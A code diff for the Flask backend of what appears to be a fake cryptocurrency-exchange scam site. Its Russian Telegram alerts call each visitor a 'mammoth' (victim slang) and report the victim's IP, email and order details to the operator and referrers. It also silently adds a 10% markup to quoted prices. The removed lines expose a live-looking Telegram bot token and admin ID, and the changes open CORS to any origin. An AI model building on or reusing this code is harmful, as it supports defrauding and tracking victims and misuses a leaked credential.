@@ -1,3 +1,4 @@
+import eventlet
 import random
 from flask import Flask,jsonify,request
 from flask_socketio import SocketIO
@@ -7,29 +8,16 @@ import string
 import requests
 from flask_cors import CORS
 from flask import send_file
+import data.config as config
 
-tgbotUrl = 'https://api.telegram.org/bot6773029189:AAFI61qZawMPfXYnIhLKM-cvKWaJxQMDF9w/sendMessage'
-adminId = '1945295238'
+tgbotUrl = f'https://api.telegram.org/bot{config.tgapi}/sendMessage'
+adminId = config.superadmin
 
 db_api.create_db()
 
-
-
 app = Flask(__name__, static_folder="static")
-CORS(app, origins=["http://localhost:3000"])
+CORS(app, origins=["*"])
 socketio = SocketIO(app, cors_allowed_origins="*")
-
-@app.route('/')
-def index():
-    return "SocketIO Server is running."
-
-@socketio.on('connect')
-def handle_connect():
-    print('Client connected')
-
-@socketio.on('disconnect')
-def handle_disconnect():
-    print('Client disconnected')
 
 @socketio.on('message')
 def handle_message(data):
@@ -48,9 +36,9 @@ def send_message():
 #    socketio.emit(f'err_redirect_user_{transID}')
 #    return {'status': 'error sent'}
 
-@app.route('/static/<svgFile>')
-def serve_content(svgFile):
-    return send_file(f'static/{svgFile}', mimetype='image/svg+xml')
+#@app.route('/static/<svgFile>')
+#def serve_content(svgFile):
+#    return send_file(f'static/{svgFile}', mimetype='image/svg+xml') --- DOGSHIT, DON'T USE
 
 
 @app.route('/calculator/<sendCurrencyName>/<receiveCurrencyName>/<sendAmount>/<receiveAmount>/<isChangeReceiveAmount>',methods = ['POST'])
@@ -69,7 +57,7 @@ def calculate(sendCurrencyName,receiveCurrencyName,sendAmount,receiveAmount,isCh
         data = requests.get(f'https://min-api.cryptocompare.com/data/blockchain/mining/calculator?fsyms={sendCurrencyName}&tsyms={receiveCurrencyName}',params=params).text
         data = json.loads(data)
         price = data['Data'][f'{sendCurrencyName}']['Price'][receiveCurrencyName]
-        totalPrice = float(sendAmount)*float(price)
+        totalPrice = float(sendAmount)*float(price)*float(1.1)
     return jsonify(amount = totalPrice)
     
 
@@ -85,12 +73,12 @@ def show_index1():
 
 @app.route('/user/<id>',methods = ['GET'])
 def getUser(id):
-    user_ip = request.remote_addr
+    user_ip = request.headers.get('X-Forwarded-For')
     online = 'true'
     telegram_message = f' 🦣 Мамонт перешел на сайт \n 🌐 IP: {user_ip}'
     inline_keyboard = {
         'inline_keyboard': [
-            [{'text': 'Ответить', 'callback_data': f'uans_{id}'}],
+            [{'text': 'Ответить', 'callback_data': f'uans_{id}'}]
             #[{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
             #[{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
         ]
@@ -121,6 +109,7 @@ def transactionsList():
 def orderupd(orderId):
     usr = db_api.checkOrder(orderId)
     if not usr:
+        print('error')
         return jsonify(error = 'not found')
     else:
         receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status,wallet = db_api.getOrderInfo(orderId)
@@ -232,28 +221,30 @@ def newOrder(receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,emai
     if 'e' in str(receiveAmount).lower():
         receiveAmount = float(receiveAmount)  
         receiveAmount = format(receiveAmount, 'f') 
-    telegram_api_url = tgbotUrl
-    payload = {
-        'text': f'<b>🤑 Мамонт создал заявку</b>\nРефка: {referalCode}\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}</b>',
-        'parse_mode': 'HTML',
-        }
-    headers = {
-        'Content-Type': 'application/json'
-        }
+    payload = f'🤑 Мамонт создал заявку\nРефка: {referalCode}\n\n{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}'
+    inline_keyboard = {
+        'inline_keyboard': [
+          [{'text': 'Ответить', 'callback_data': f'uans_{id}'}]
+            #[{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
+            #[{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
+        ]
+    }
     if str(referalCode) != 'null':
-        id = db_api.getUserId(referalCode)
-        id2 = adminId
-        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
-        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
+        #id = db_api.getUserId(referalCode)
+        #id2 = adminId
+        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
+        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
+        send_telegram_message(payload, inline_keyboard)
     elif str(referalCode) == 'null':
         # If referalCode is 'null', send to a single, specific ID
-        id = adminId  # replace with actual ID for null referal code
-        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id': id}), headers=headers)
+        #id = adminId  # replace with actual ID for null referal code
+        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id': id}), headers=headers)
+        send_telegram_message(payload, inline_keyboard)
     orderId = db_api.addOrder(orderIdd,receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status)
-    if response.status_code == 200:
-        print('Message sent successfully.')
-    else:
-        print('Failed to send message. Error:', response.text)
+    #if response.status_code == 200:
+    #    print('Message sent successfully.')
+    #else:
+    #    print('Failed to send message. Error:', response.text)
     return jsonify(orderId = orderIdd)
 
 def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
@@ -264,7 +255,8 @@ def address_generator(size=6, chars=string.ascii_uppercase + string.digits):
 
 
 if __name__ == '__main__':
-    #socketio.run(app, host="0.0.0.0", port=56742, debug=True)
-    #app.run(host="0.0.0.0", port=8000, debug=True)
-    from waitress import serve
-    serve(app, host="10.163.108.1", port=8080)
+    #socketio.run(app, host="127.0.0.1", port=5000, debug=True)
+    #app.run()
+    #from waitress import serve
+    #serve(app, host="127.0.0.1", port=5000)
+    eventlet.wsgi.server(eventlet.listen(('127.0.0.1', 5000)), app)
